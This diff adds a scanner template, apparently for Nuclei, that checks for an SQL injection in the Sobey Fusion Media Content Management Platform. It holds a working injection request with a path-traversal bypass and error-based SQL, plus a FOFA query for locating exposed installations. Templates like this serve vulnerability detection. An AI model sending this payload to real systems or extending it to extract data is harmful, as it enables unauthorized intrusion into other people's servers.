@@ -1,0 +1,35 @@
+id: poc-yaml-sobey-imcmp-queryeditorscorerank-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform queryEditorScoreRank SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Sobey Fusion Media Content Management Platform
+    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/jztEditorScore/queryEditorScoreRank?siteCode=&targetUserType='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN&token=&userCode=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Sobey"
+          - ".queryEditorScoreRank"
+          - "java.sql.SQLException"
+        part: body
+      - type: regex
+        regex:
+          - "~{{t2}}~"
+        part: body
